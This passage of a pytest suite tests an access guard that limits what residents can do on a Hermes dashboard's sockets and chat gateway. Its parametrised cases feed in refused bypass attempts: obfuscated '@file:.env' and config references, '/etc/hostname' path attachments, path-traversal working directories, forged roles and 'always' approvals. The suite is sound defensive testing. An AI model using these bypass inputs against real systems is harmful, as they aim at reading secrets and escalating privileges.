    assert body.index(b"window.__HERMES_BASE_PATH__") < body.index(b'data-edgecity="plugins-admin-only"')
    assert resp.headers.get("content-length") == str(len(body))


@pytest.mark.parametrize("path", ["/", "/sessions", "/plugins", "/config"])
def test_the_spa_index_under_an_admin_is_byte_identical(dash, path):
    resp, _ = dash.request("GET", path, headers=dash.login(ADMIN))
    assert resp.body == INDEX and resp.headers.get("content-length") == str(len(INDEX))


def test_the_login_page_and_api_responses_are_never_touched(dash):
    assert dash.request("GET", "/login")[0].body == LOGIN
    resp, _ = dash.request("GET", "/api/auth/me", headers=dash.login(OWNER))
    assert resp.body == {"path": "/api/auth/me"}


@pytest.mark.parametrize("response", [
    Response(200, INDEX, "application/json"),
    Response(200, INDEX, "text/plain"),
    Response(404, INDEX, "text/html"),
    Response(200, LOGIN, "text/html"),
    Response(200, {"not": "bytes"}, "text/html"),
    Response(200, INDEX.replace(b"</head>", b""), "text/html"),
])
def test_anything_but_the_index_is_byte_identical(guard, response):
    before = response.body
    out = asyncio.run(guard.hide_plugins_page(response))
    assert out is response and out.body == before


def test_a_compressed_index_is_byte_identical(guard):
    response = Response(200, INDEX, "text/html")
    response.headers["content-encoding"] = "gzip"
    assert asyncio.run(guard.hide_plugins_page(response)).body == INDEX


def test_the_hide_is_applied_once(guard):
    once = guard.inject_hide(INDEX)
    assert once is not None and guard.inject_hide(once) is None


def test_a_streamed_index_is_hidden_and_its_length_fixed(guard):
    out = asyncio.run(guard.hide_plugins_page(Streamed([INDEX[:40], INDEX[40:]])))
    body = b"".join(out.read())
    assert body == guard.inject_hide(INDEX) and out.headers.get("content-length") == str(len(body))


def test_a_streamed_asgi_message_or_an_oversize_body_goes_out_unchanged(guard, monkeypatch):
    message = {"type": "http.response.pathsend", "path": "/x"}
    _, chunks = hide_and_read(guard, Streamed([INDEX[:10], message, INDEX[10:]]))
    assert chunks == [INDEX[:10], message, INDEX[10:]]
    monkeypatch.setattr(guard, "MAX_HTML_BYTES", 32)
    out, chunks = hide_and_read(guard, Streamed([INDEX[:20], INDEX[20:40], INDEX[40:]]))
    assert chunks == [INDEX[:20], INDEX[20:40], INDEX[40:]] and out.headers.get("content-length") == str(len(INDEX))


def test_a_stream_that_fails_fails_where_it_would_have(guard):
    out = asyncio.run(guard.hide_plugins_page(Streamed([INDEX[:10], RuntimeError("app broke")])))
    with pytest.raises(RuntimeError, match="app broke"):
        out.read()


def test_a_broken_hide_never_breaks_the_page(dash, monkeypatch):
    async def boom(response):
        raise RuntimeError("hide broke")

    monkeypatch.setattr(dash.mod, "hide_plugins_page", boom)
    resp, _ = dash.request("GET", "/plugins", headers=dash.login(OWNER))
    assert resp.status_code == 200 and resp.body == INDEX
    assert dash.mod.counts()["html_hide_error"] == 1


# ---- tickets and sockets (stand-ins for ws_tickets and web_server_chat) --------------------------


class TicketInvalid(Exception):
    pass


def ticket_store():
    """`hermes_cli.dashboard_auth.ws_tickets` in miniature: single-use tickets with an info dict."""
    tickets = {}

    def mint_ticket(*, user_id, provider, extra=None):
        ticket = f"t{len(tickets)}-{provider}"
        tickets[ticket] = {"user_id": user_id, "provider": provider, **(extra or {})}
        return ticket

    def consume_ticket(ticket):
        if ticket not in tickets:
            raise TicketInvalid("unknown ticket")
        return tickets.pop(ticket)

    return SimpleNamespace(mint_ticket=mint_ticket, consume_ticket=consume_ticket, TicketInvalid=TicketInvalid,
                           tickets=tickets)


def socket_auth(store):
    """`web_server_chat._ws_auth_reason` in miniature: looks the ticket store up at call time, as
    the real one imports `consume_ticket` inside the function."""

    def _ws_auth_reason(ws):
        q = ws.query
        if q.get("internal"):
            return (None, "internal") if q["internal"] == "server-cred" else ("internal_invalid", "internal")
        if q.get("ticket"):
            try:
                store.consume_ticket(q["ticket"])
                return None, "ticket"
            except store.TicketInvalid:
                return "ticket_invalid", "ticket"
        if q.get("token"):
            return None, "token"
        return "no_credential", "none"

    return SimpleNamespace(_ws_auth_reason=_ws_auth_reason)


def ws(path, **query):
    return SimpleNamespace(url=SimpleNamespace(path=path), scope={"type": "websocket", "path": path}, query=query)


def mint_as(guard, store, role, provider="edgecity", extra=None):
    """A ticket minted inside an HTTP request the guard judged `role` (None: outside any request)."""
    token = guard._REQUEST_ROLE.set(role)
    try:
        return store.mint_ticket(user_id="u1", provider=provider, extra=extra)
    finally:
        guard._REQUEST_ROLE.reset(token)


class Transport:
    """`tui_gateway.ws.WSTransport` as far as the guard reads it: the socket and the server-minted
    identity (`ws.py:99`)."""

    def __init__(self, sock, user_id="u1", provider="edgecity"):
        self._ws = sock
        self.auth_identity = {"user_id": user_id, "provider": provider}


def make_handle_ws(server):
    """`tui_gateway.ws.handle_ws` in miniature: every frame dispatched through `server.dispatch`,
    looked up at call time, in `asyncio.to_thread` (which copies the context). One transport per
    connection, as Hermes's."""

    async def handle_ws(sock, *, auth_identity=None, subprotocol=None):
        transport = getattr(sock, "transport", None) or Transport(sock, getattr(sock, "user_id", "u1"))
        sock.transport = transport
        out = []
        for frame in sock.frames:
            out.append(await asyncio.to_thread(server.dispatch, frame, transport))
        return out

    return handle_ws


def live_chats():
    """`server._sessions` in miniature: live chats with the login Hermes stamped on each
    (`auth_user_id`, `methods_session.py:393`) and the logins attached to it."""
    return {
        "own-sid": {"session_key": "own-key", "auth_user_id": "edgecity:u1", "attached": {"edgecity:u1"}},
        "admin-sid": {"session_key": "adm1", "auth_user_id": "edgecity:admin-9", "attached": {"edgecity:admin-9"}},
        "pty-sid": {"session_key": "pty1", "auth_user_id": None, "attached": {None}},
        "mirror-sid": {"session_key": "tg1", "auth_user_id": "edgecity:u1", "attached": set()},
    }


#: Open server->client requests (`server_requests._open`): id -> (method, chat).
OPEN_REQUESTS = {
    "srq-own-approval": ("approval", "own-sid"), "srq-own-clarify": ("clarify", "own-sid"),
    "srq-own-secret": ("secret", "own-sid"), "srq-own-sudo": ("sudo", "own-sid"),
    "srq-admin-approval": ("approval", "admin-sid"), "srq-pty-approval": ("approval", "pty-sid"),
    "srq-mirror-approval": ("approval", "mirror-sid"),
}
#: Pending approvals per stored chat (`tools.approval.list_gateway_approvals`).
PENDING = {"own-key": [{"request_id": "req-own-1"}], "adm1": [{"request_id": "req-admin-1"}]}


def gateway_stand_in():
    calls, frames = [], []

    def dispatch(req, transport=None):
        calls.append(req.get("method") if isinstance(req, dict) else req)
        frames.append(req)
        rid = req.get("id") if isinstance(req, dict) else None
        if isinstance(req, dict) and req.get("method") == "session.create":
            return {"id": rid, "result": {"session_id": "new-sid", "stored_session_id": "new-key"}}
        if isinstance(req, dict) and req.get("method") == "session.list":
            # `methods_session.py:117`: id, title, preview, started_at, message_count, source; no user_id.
            return {"id": rid, "result": {"sessions": [
                {"id": r["id"], "title": r.get("title", ""), "preview": r.get("preview", ""), "started_at": 0,
                 "message_count": 1, "source": r.get("source") or ""} for r in LIST_ROWS]}}
        if isinstance(req, dict) and req.get("method") == "session.most_recent":
            return {"id": rid, "result": {"session_id": server.most_recent, "title": "t", "started_at": 0,
                                          "source": "tool"}}
        return {"id": rid, "result": "ran"}

    def login(transport):
        ident = transport.auth_identity
        return f"{ident['provider']}:{ident['user_id']}" if ident else None

    import threading

    server = SimpleNamespace(
        dispatch=dispatch, _sessions=live_chats(), _sessions_lock=threading.Lock(),
        _session_transport_contains=lambda rec, t: login(t) in rec.get("attached", ()))
    server.frames = frames
    server.most_recent = "abc123"
    requests = SimpleNamespace(_lock=threading.Lock(), _open={
        rid: SimpleNamespace(id=rid, method=m, sid=sid) for rid, (m, sid) in OPEN_REQUESTS.items()})
    server.requests = requests
    server.approvals = lambda key: PENDING.get(key, [])
    return server, SimpleNamespace(handle_ws=make_handle_ws(server)), calls


@pytest.fixture
def sockets(guard):
    store = ticket_store()
    chat = socket_auth(store)
    assert guard.install_tickets(store) is True
    assert guard.install_ws(chat) is True
    server, gateway_ws, calls = gateway_stand_in()
    guard.set_loader("gateway", lambda: (server, gateway_ws))
    return SimpleNamespace(guard=guard, store=store, chat=chat, server=server, gateway_ws=gateway_ws)


def test_a_ticket_carries_the_role_of_the_request_that_minted_it(sockets):
    g, store = sockets.guard, sockets.store
    admin, owner, outside = mint_as(g, store, "admin"), mint_as(g, store, "resident"), mint_as(g, store, None)
    assert store.tickets[admin]["edgecity_role"] == "admin"
    assert store.tickets[owner]["edgecity_role"] == "resident"
    assert store.tickets[outside]["edgecity_role"] == "resident"
    forged = mint_as(g, store, "resident", extra={"edgecity_role": "admin"})  # a caller cannot name its role
    assert store.tickets[forged]["edgecity_role"] == "resident"


@pytest.mark.parametrize("path", ["/api/console", "/api/pty", "/api/pub", "/api/events", "/api/audio/speak-stream",
                                  "/api/plugins/kanban/events", "/api/display/ws", "/api/unknown"])
def test_a_resident_ticket_opens_no_socket_but_the_chat_gateway(sockets, path):
    sock = ws(path, ticket=mint_as(sockets.guard, sockets.store, "resident"))
    assert sockets.chat._ws_auth_reason(sock) == ("edgecity_admin_only", "ticket")
    assert sock._edgecity_ws_role == "resident"


def test_a_resident_ticket_opens_the_chat_gateway_once_the_method_guard_is_in(sockets):
    g = sockets.guard
    assert g.installed()["gateway"] is False
    sock = ws("/api/ws", ticket=mint_as(g, sockets.store, "resident"))
    assert sockets.chat._ws_auth_reason(sock) == (None, "ticket")
    assert g.installed()["gateway"] is True
    assert sockets.server.dispatch._edgecity_resident_guard is True


def test_without_the_method_guard_a_resident_cannot_open_the_chat_gateway(sockets):
    g = sockets.guard

    def broken():
        raise ImportError("no tui_gateway")

    g.set_loader("gateway", broken)
    sock = ws("/api/ws", ticket=mint_as(g, sockets.store, "resident"))
    assert sockets.chat._ws_auth_reason(sock) == ("edgecity_admin_only", "ticket")
    assert g.counts()["denied_seam_gateway_missing"] == 1
    assert sockets.chat._ws_auth_reason(ws("/api/ws", ticket=mint_as(g, sockets.store, "resident")))[0] is not None
    assert g.counts()["denied_seam_gateway_missing"] == 1  # not retried on every connection
    assert sockets.chat._ws_auth_reason(ws("/api/ws", ticket=mint_as(g, sockets.store, "admin"))) == (None, "ticket")


@pytest.mark.parametrize("path", ["/api/console", "/api/pty", "/api/pub", "/api/events", "/api/ws", "/api/plugins/kanban/events"])
def test_an_admin_ticket_opens_every_socket(sockets, path):
    sock = ws(path, ticket=mint_as(sockets.guard, sockets.store, "admin"))
    assert sockets.chat._ws_auth_reason(sock) == (None, "ticket") and sock._edgecity_ws_role == "admin"


@pytest.mark.parametrize("path,allowed", [("/api/ws", True), ("/api/pub", True), ("/api/console", False),
                                          ("/api/pty", False), ("/api/events", False)])
def test_the_pty_childs_internal_credential_opens_only_its_two_sockets(sockets, path, allowed):
    sock = ws(path, internal="server-cred")
    assert sockets.chat._ws_auth_reason(sock) == ((None, "internal") if allowed else ("edgecity_admin_only", "internal"))


def test_the_loopback_token_is_a_resident(sockets):
    assert sockets.chat._ws_auth_reason(ws("/api/console", token="tok")) == ("edgecity_admin_only", "token")
    assert sockets.chat._ws_auth_reason(ws("/api/ws", token="tok")) == (None, "token")


def test_hermes_own_refusals_pass_through_unchanged(sockets):
    assert sockets.chat._ws_auth_reason(ws("/api/console")) == ("no_credential", "none")
    assert sockets.chat._ws_auth_reason(ws("/api/console", ticket="never-minted")) == ("ticket_invalid", "ticket")
    assert sockets.chat._ws_auth_reason(ws("/api/console", internal="wrong")) == ("internal_invalid", "internal")


def test_a_socket_whose_paths_disagree_is_refused_to_a_resident(sockets):
    sock = ws("/api/ws", ticket=mint_as(sockets.guard, sockets.store, "resident"))
    sock.scope["path"] = "/api/console"
    assert sockets.chat._ws_auth_reason(sock)[0] == "edgecity_admin_only"


def test_a_ticket_without_a_role_is_a_residents(sockets):
    """Minted before the wrapper was in place, or by any path that bypassed it."""
    sockets.store.tickets["raw"] = {"user_id": "u1", "provider": "edgecity"}
    assert sockets.chat._ws_auth_reason(ws("/api/console", ticket="raw")) == ("edgecity_admin_only", "ticket")


def test_a_display_ticket_minted_outside_an_admin_request_is_refused(sockets):
    g, store = sockets.guard, sockets.store
    resident = mint_as(g, store, "resident", provider="bot-desktop", extra={"hermes_home": "/h"})
    with pytest.raises(TicketInvalid):
        store.consume_ticket(resident)
    admin = mint_as(g, store, "admin", provider="bot-desktop", extra={"hermes_home": "/h"})
    assert store.consume_ticket(admin)["hermes_home"] == "/h"


def test_an_exception_in_the_socket_guard_is_a_refusal(sockets, monkeypatch):
    def boom(*a):
        raise RuntimeError("guard broke")

    monkeypatch.setattr(sockets.guard, "ws_path_allowed", boom)
    sock = ws("/api/ws", ticket=mint_as(sockets.guard, sockets.store, "admin"))
    assert sockets.chat._ws_auth_reason(sock) == ("edgecity_guard_error", "ticket")


def test_socket_and_ticket_wrappers_are_one_layer(sockets):
    g, store, chat = sockets.guard, sockets.store, sockets.chat
    mint, consume, auth = store.mint_ticket, store.consume_ticket, chat._ws_auth_reason
    copy = load_copy(g, "edgecity_test_resident_guard_copy2")
    assert copy.install_tickets(store) and copy.install_ws(chat)
    assert store.mint_ticket._edgecity_original is mint._edgecity_original
    assert store.consume_ticket._edgecity_original is consume._edgecity_original
    assert chat._ws_auth_reason._edgecity_original is auth._edgecity_original
    assert g.install_tickets(SimpleNamespace(mint_ticket=mint)) is False
    assert g.install_ws(SimpleNamespace()) is False


def test_tickets_that_cannot_carry_a_role_are_not_wrapped_and_every_socket_is_a_residents(guard):
    """Hermes before 0.21.5: `mint_ticket(*, user_id, provider)` with no `extra`."""
    store = ticket_store()

    def old_mint(*, user_id, provider):
        return store.mint_ticket(user_id=user_id, provider=provider)

    old = SimpleNamespace(mint_ticket=old_mint, consume_ticket=store.consume_ticket, TicketInvalid=TicketInvalid)
    assert guard.install_tickets(old) is False and old.mint_ticket is old_mint
    chat = socket_auth(store)
    assert guard.install_ws(chat) is True
    admin_ticket = mint_as(guard, store, "admin")
    assert chat._ws_auth_reason(ws("/api/console", ticket=admin_ticket)) == ("edgecity_admin_only", "ticket")


def test_without_the_socket_seam_the_embedded_chat_is_switched_off(guard):
    web_server = SimpleNamespace(_DASHBOARD_EMBEDDED_CHAT_ENABLED=True)
    assert guard.close_embedded_chat(web_server) is True and web_server._DASHBOARD_EMBEDDED_CHAT_ENABLED is False
    assert guard.close_embedded_chat(SimpleNamespace()) is False


# ---- gateway methods (stand-ins for tui_gateway.server and tui_gateway.ws) -----------------------


def rpc(method, params=None, rid=1):
    return {"jsonrpc": "2.0", "id": rid, "method": method, "params": {} if params is None else params}


@pytest.fixture
def gateway(guard, home):
    """The guard on a stand-in gateway whose original dispatch records what reaches it, with live
    chats, open server requests, pending approvals and stored sessions to judge ownership by."""
    server, gateway_ws, calls = gateway_stand_in()
    assert guard.install_gateway(server, gateway_ws, server.requests, server.approvals) is True
    guard.set_session_lookup(session_lookup())
    guard.set_session_owners(session_owners())

    def talk(role, frames, user_id="u1", sock=None):
        sock = sock or ws("/api/ws")
        if role is not None:
            sock._edgecity_ws_role = role
        sock.user_id = user_id
        sock.frames = frames
        return asyncio.run(gateway_ws.handle_ws(sock))

    return SimpleNamespace(guard=guard, server=server, ws=gateway_ws, calls=calls, talk=talk, home=home)


def refused(resp, reason="admin_only"):
    return (isinstance(resp, dict) and resp.get("error", {}).get("code") == 4031
            and resp["error"]["data"]["reason"] == reason)


ADMIN_ONLY_METHODS = ["shell.exec", "cli.exec", "plugins.manage", "slash.exec", "command.dispatch", "config.set",
                      "browser.manage", "connectors.connect", "vault.add", "vault.unlock", "profiles.create",
                      "display.start", "display.observe", "model.save_key", "session.foreign.import", "complete.path",
                      "spawn_tree.save", "llm.oneshot", "onboarding.reset_setup_profile", "image.generate",
                      "config.get", "reload.mcp", "clarify.lock", "session.cwd.set", "session.activate",
                      "session.branch_stored", "unknown.method", "", None, 7]

LISTED_METHODS = [
    "ping", "gateway.capabilities", "client.capabilities", "session.create", "session.resume", "session.list",
    "session.most_recent", "session.title", "session.close", "session.delete", "session.interrupt",
    "session.events.since", "prompt.submit", "approval.pending", "approval.received", "approval.respond",
    "request.answer", "image.attach_bytes", "image.detach", "file.attach", "pdf.attach", "model.options"]

#: Parameters under which each listed method is the resident's own business.
GOOD_PARAMS = {
    "session.create": {"source": "tool", "close_on_disconnect": True},
    "session.resume": {"session_id": "abc123"},
    "session.title": {"session_id": "own-sid", "title": "x"},
    "session.close": {"session_id": "own-sid"},
    "session.delete": {"session_id": "tg1"},
    "session.interrupt": {"session_id": "own-sid"},
    "session.events.since": {"session_id": "own-sid", "last_seen": 0},
    "prompt.submit": {"session_id": "own-sid", "text": "hello, mail me at a@b.c"},
    "approval.pending": {"session_id": "own-sid"},
    "approval.received": {"session_id": "own-sid", "request_id": "req-own-1"},
    "approval.respond": {"session_id": "own-sid", "request_id": "req-own-1", "choice": "once"},
    "request.answer": {"id": "srq-own-approval", "result": {"choice": "session"}},
    "image.attach_bytes": {"session_id": "own-sid", "content_base64": "aGk="},
    "image.detach": {"session_id": "own-sid", "path": "img_1.png"},
    "file.attach": {"session_id": "own-sid", "data_url": "data:,x"},
    "pdf.attach": {"session_id": "own-sid", "content_base64": "JVBER"},
    "model.options": {"session_id": "own-sid"},
}


@pytest.mark.parametrize("method", ADMIN_ONLY_METHODS)
def test_a_resident_connection_calls_nothing_off_the_method_list(gateway, method):
    [resp] = gateway.talk("resident", [{"jsonrpc": "2.0", "id": 9, "method": method, "params": {"command": "echo x"}}])
    assert refused(resp) and resp["id"] == 9
    assert gateway.calls == []


@pytest.mark.parametrize("method", LISTED_METHODS)
def test_a_resident_connection_calls_the_listed_methods_on_its_own_chats(gateway, method):
    [resp] = gateway.talk("resident", [rpc(method, dict(GOOD_PARAMS.get(method, {})))])
    assert "error" not in resp and gateway.calls == [method], resp


def test_the_method_list_is_the_one_in_the_module(guard):
    assert set(guard.RESIDENT_GATEWAY_METHODS) == set(LISTED_METHODS)
    for name, (rules, why) in guard.RESIDENT_GATEWAY_METHODS.items():
        assert isinstance(rules, tuple) and why.strip(), name
    for name, (rule, why) in guard.RESIDENT_SERVER_REQUESTS.items():
        assert rule in (None, guard.NO_ALWAYS) and why.strip(), name
    assert set(guard.RESIDENT_SERVER_REQUESTS) == {"approval", "clarify"}


@pytest.mark.parametrize("role", ["resident", None, "", "Admin", "admin ", "owner", "INTERNAL", "unknown", 0, object()])
def test_the_method_decision_allows_nothing_off_the_list_for_any_role_but_admin_and_internal(guard, home, role):
    """The decision function itself, every role that is not exactly "admin" or "internal" (a missing
    role included): only listed methods pass, and without a view of the live state none that
    touches a chat does (fail closed)."""
    for method in ADMIN_ONLY_METHODS + ["plugins.manage", "shell.exec", "Prompt.submit", "prompt.submit ", b"ping"]:
        assert guard.gateway_method_allowed(role, method, {}) is False, (role, method)
    for method in LISTED_METHODS:
        free = guard.RESIDENT_GATEWAY_METHODS[method][0] in ((), (guard.OWN_SESSION_IF_GIVEN,), (guard.PINNED_CWD,))
        # OWN_ROWS (the session lists) needs the connection's login to filter by: no view, no list.
        assert guard.gateway_method_allowed(role, method, {}) is free, (role, method)
    assert guard.gateway_method_allowed(role, "prompt.submit", ["not", "a", "dict"]) is False


@pytest.mark.parametrize("role", ["admin", "internal"])
def test_the_method_decision_allows_everything_for_admin_and_the_pty_child(guard, role):
    for method in ADMIN_ONLY_METHODS + LISTED_METHODS:
        assert guard.gateway_method_allowed(role, method, {"choice": "always", "path": "/x", "session_id": "x"}) is True
    assert guard.gateway_decision(role, {"id": "srq-x", "result": {"choice": "always"}})[0] == "admin_allowed"


def test_a_socket_without_a_role_is_judged_a_resident(guard):
    assert guard._role_of_ws(SimpleNamespace()) == "resident"
    assert guard._role_of_ws(SimpleNamespace(_edgecity_ws_role="Admin")) == "resident"
    assert guard._role_of_ws(None) == "resident"
    assert guard.ws_role("ticket", None) == "resident" and guard.ws_role(None, "admin") == "resident"


@pytest.mark.parametrize("frame,ok", [
    (rpc("file.attach", {"session_id": "own-sid", "data_url": "data:text/plain;base64,aGk=", "name": "a.txt"}), True),
    (rpc("file.attach", {"session_id": "own-sid", "path": "/etc/hostname"}), False),
    (rpc("file.attach", {"session_id": "own-sid", "path": "  /etc/hostname ", "data_url": "data:,x"}), False),
    (rpc("pdf.attach", {"session_id": "own-sid", "content_base64": "JVBER"}), True),
    (rpc("pdf.attach", {"session_id": "own-sid", "path": "/tmp/a.pdf"}), False),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "once"}), True),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "session"}), True),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "deny"}), True),
    (rpc("approval.respond", {"session_id": "own-sid"}), True),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "always"}), False),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "ALWAYS"}), False),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": None}), False),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": ["once"]}), False),
    (rpc("approval.respond", {"session_id": "own-sid", "choice": "once", "all": True}), True),
    (rpc("session.create", {"cwd": "{home}/resident-chat"}), True),
    (rpc("session.create", {"cwd": "{home}/resident-chat/sub/.."}), True),
    (rpc("session.create", {"cwd": "{home}"}), False),
    (rpc("session.create", {"cwd": "/"}), False),
    (rpc("session.create", {"cwd": "/tmp/work"}), False),
    (rpc("session.create", {"cwd": "{home}/resident-chat/.."}), False),
    (rpc("session.create", {"cwd": "~/.hermes/plugins"}), False),
    (rpc("session.create", {"cwd": "{home}/.dashboard-auth-edgecity"}), False),
    (rpc("session.create", {"profile": "worker"}), False),
    (rpc("session.create", {"profile": "default"}), True),
    (rpc("session.create", {"parent_session_id": "abc123"}), True),
    (rpc("session.create", {"parent_session_id": "adm1"}), False),
    (rpc("prompt.submit", ["not", "a", "dict"]), False),
    ({"jsonrpc": "2.0", "id": 1, "method": "prompt.submit"}, False),
    (rpc("prompt.submit", {"session_id": "own-sid", "text": "hi", "_turn_author": {"id": "x"}}), False),
    (rpc("prompt.submit", {"session_id": "own-sid", "text": "hi", "_hosted_task": {}}), False),
    (rpc("model.options", {}), True),
    (rpc("model.options", {"session_id": "admin-sid"}), False),
    (rpc("ping", {"profile": "other"}), False),
    (rpc("session.list", {"profile": "default"}), True),
])
def test_parameter_rules_for_a_resident(gateway, frame, ok):
    if isinstance(frame.get("params"), dict) and "cwd" in frame["params"]:
        frame["params"]["cwd"] = frame["params"]["cwd"].format(home=gateway.home)
        (gateway.home / "resident-chat" / "sub").mkdir(parents=True, exist_ok=True)
    [resp] = gateway.talk("resident", [frame])
    assert ("error" not in resp) is ok, resp
    if not ok:
        assert refused(resp) or refused(resp, "not_own_session"), resp


# ---- S-new-1: a resident's own chats --------------------------------------------------------------


@pytest.mark.parametrize("method,params", [
    ("session.title", {"session_id": "admin-sid", "title": "x"}),
    ("session.close", {"session_id": "admin-sid"}),
    ("session.interrupt", {"session_id": "pty-sid"}),
    ("session.events.since", {"session_id": "admin-sid"}),
    ("prompt.submit", {"session_id": "admin-sid", "text": "hi"}),
    ("approval.pending", {"session_id": "pty-sid"}),
    ("approval.received", {"session_id": "admin-sid", "request_id": "req-admin-1"}),
    ("approval.respond", {"session_id": "admin-sid", "request_id": "req-admin-1", "choice": "once"}),
    # Hermes's fallback (`methods_prompt.py:1206-1233`) looks a request_id up box-wide when the
    # session id is not a live one: refused before it can run.
    ("approval.respond", {"session_id": "not-a-live-sid", "request_id": "req-admin-1", "choice": "once"}),
    ("approval.respond", {"session_id": "own-sid", "request_id": "req-admin-1", "choice": "once"}),
    ("approval.respond", {"request_id": "req-admin-1", "choice": "deny"}),
    ("approval.received", {"session_id": "own-sid", "request_id": "req-admin-1"}),
    ("image.attach_bytes", {"session_id": "admin-sid", "content_base64": "aGk="}),
    ("image.detach", {"session_id": "admin-sid", "path": "img_1.png"}),
    ("file.attach", {"session_id": "admin-sid", "data_url": "data:,x"}),
    ("pdf.attach", {"session_id": "admin-sid", "content_base64": "JVBER"}),
    ("model.options", {"session_id": "pty-sid"}),
    ("session.resume", {"session_id": "adm1"}),
    ("session.resume", {"session_id": "pty1"}),
    ("session.resume", {"session_id": "cron1"}),
    ("session.resume", {"session_id": "nope"}),
    ("session.resume", {"session_id": "abc"}),          # a prefix or a title: Hermes resolves those; the guard does not
    ("session.resume", {"session_id": "tg1"}),          # the resident's Telegram chat, but a live chat elsewhere holds it
    ("session.resume", {}),
    ("session.delete", {"session_id": "adm1"}),
    ("session.delete", {"session_id": 7}),
    ("session.title", {"title": "no session named"}),
    ("session.title", {"session_id": ["own-sid"]}),
])
def test_a_resident_touches_no_chat_but_its_own(gateway, method, params):
    gateway.server._sessions["mirror-sid"]["auth_user_id"] = "edgecity:admin-9"
    [resp] = gateway.talk("resident", [rpc(method, params)])
    assert refused(resp, "not_own_session"), resp
    assert gateway.calls == []


def test_a_chat_this_connection_created_is_its_own_and_another_connection_of_the_same_login_too(gateway):
    sock = ws("/api/ws")
    out = gateway.talk("resident", [rpc("session.create", {}, rid=1)], sock=sock)
    assert out[0]["result"]["session_id"] == "new-sid"
    gateway.server._sessions["new-sid"] = {"session_key": "new-key", "auth_user_id": "edgecity:u1", "attached": {"edgecity:u1"}}
    out = gateway.talk("resident", [rpc("prompt.submit", {"session_id": "new-sid", "text": "hi"}, rid=2),
                                    rpc("session.resume", {"session_id": "new-key"}, rid=3)], sock=sock)
    assert all("error" not in r for r in out), out
    # A second socket of the same login (a reconnect) owns it by the login Hermes stamped on it.
    [again] = gateway.talk("resident", [rpc("session.title", {"session_id": "new-sid"})])
    assert "error" not in again
    # Another login's socket does not.
    [other] = gateway.talk("resident", [rpc("session.title", {"session_id": "new-sid"})], user_id="u2")
    assert refused(other, "not_own_session")


def test_a_chat_created_here_without_a_login_is_its_own_only_on_this_connection(gateway):
    gateway.server._sessions["anon-sid"] = {"session_key": "anon-key", "auth_user_id": None, "attached": {None}}
    sock = ws("/api/ws")
    sock.transport = Transport(sock)
    sock.transport.auth_identity = None
    gateway.guard._own(sock.transport)["sids"].add("anon-sid")
    [own] = gateway.talk("resident", [rpc("session.title", {"session_id": "anon-sid"})], sock=sock)
    assert "error" not in own
    [pty] = gateway.talk("resident", [rpc("session.title", {"session_id": "pty-sid"})], sock=sock)
    assert refused(pty, "not_own_session")


def test_a_resident_session_create_runs_in_the_resident_chat_directory(gateway):
    (gateway.home / "AGENTS.md").write_text("# rules\n")
    [resp] = gateway.talk("resident", [rpc("session.create", {"source": "tool"})])
    assert "error" not in resp
    cwd = gateway.server.frames[-1]["params"]["cwd"]
    assert cwd == os.path.realpath(gateway.home / "resident-chat")
    assert os.path.islink(os.path.join(cwd, "AGENTS.md"))
    assert os.path.realpath(os.path.join(cwd, "AGENTS.md")) == os.path.realpath(gateway.home / "AGENTS.md")
    assert (os.stat(cwd).st_mode & 0o777) == 0o700
    # An admin's create is untouched.
    gateway.talk("admin", [rpc("session.create", {"cwd": "/"})])
    assert gateway.server.frames[-1]["params"] == {"cwd": "/"}


def test_a_symlinked_resident_chat_directory_refuses_the_chat(gateway):
    os.symlink(str(gateway.home), str(gateway.home / "resident-chat"))
    [resp] = gateway.talk("resident", [rpc("session.create", {})])
    assert refused(resp) and gateway.calls == []
    assert gateway.guard.counts()["denied_gateway_cwd"] == 1


@pytest.mark.parametrize("text", [
    "@file:config.yaml", "look at @file:plugins/p1/__init__.py", "@folder:.dashboard-auth-edgecity",
    "@FILE:config.yaml", "@File:'config.yaml'", "x@file:config.yaml", "@fi​le:config.yaml",
    "@fi\x1b[200~le:config.yaml", "＠file:config.yaml", "@ file: config.yaml", "@folder:/",
    "line one\n@file:.env", 7, ["@file:x"],
])
def test_a_resident_prompt_with_a_file_reference_is_refused(gateway, text):
    [resp] = gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])
    assert refused(resp) and gateway.calls == []


@pytest.mark.parametrize("text", ["hello", "mail me at a@b.c", "@diff", "a file: here", "@url:https://example.org", None])
def test_a_resident_prompt_without_one_goes_through(gateway, text):
    params = {"session_id": "own-sid"} if text is None else {"session_id": "own-sid", "text": text}
    [resp] = gateway.talk("resident", [rpc("prompt.submit", params)])
    assert "error" not in resp


def test_the_file_reference_check_uses_hermess_sanitiser_too(guard):
    guard.set_prompt_sanitizer(lambda text: text.replace("<x>", ""))
    assert guard.names_file_reference("@fi<x>le:config.yaml") is True
    guard.set_prompt_sanitizer(lambda text: (_ for _ in ()).throw(RuntimeError("broken")))
    assert guard.names_file_reference("hello") is True  # a sanitiser that fails is a refusal
    guard.set_prompt_sanitizer(None)
    assert guard.names_file_reference("hello") is False


# ---- M-new-1: a resident answers only its own requests, and never "always" ------------------------


def answer(rid, result=None, error=None):
    frame = {"jsonrpc": "2.0", "id": rid}
    if error is not None:
        frame["error"] = error
    else:
        frame["result"] = result
    return frame


@pytest.mark.parametrize("frame,code", [
    (answer("srq-own-approval", {"choice": "always"}), "denied_gateway_always"),
    (answer("srq-own-approval", {"choice": "ALWAYS"}), "denied_gateway_always"),
    (answer("srq-own-approval", {"choice": "permanent"}), "denied_gateway_always"),
    (answer("srq-own-approval", {"choice": None}), "denied_gateway_always"),
    (answer("srq-own-approval", {"choice": ["once"]}), "denied_gateway_always"),
    (answer("srq-own-approval", "always"), "denied_answer_result"),
    (answer("srq-own-approval", None), "denied_answer_result"),
    (answer("srq-admin-approval", {"choice": "once"}), "denied_answer_foreign"),
    (answer("srq-pty-approval", {"choice": "deny"}), "denied_answer_foreign"),
    (answer("srq-mirror-approval", {"choice": "once"}), "denied_answer_foreign"),  # own login, not attached here
    (answer("srq-unknown", {"choice": "once"}), "denied_answer_unknown"),
    (answer(7, {"choice": "once"}), "denied_answer_unknown"),
    (answer("srq-unknown", error={"code": -32601}), "denied_answer_unknown"),
    (answer("srq-own-secret", {"value": "placeholder"}), "denied_answer_kind"),
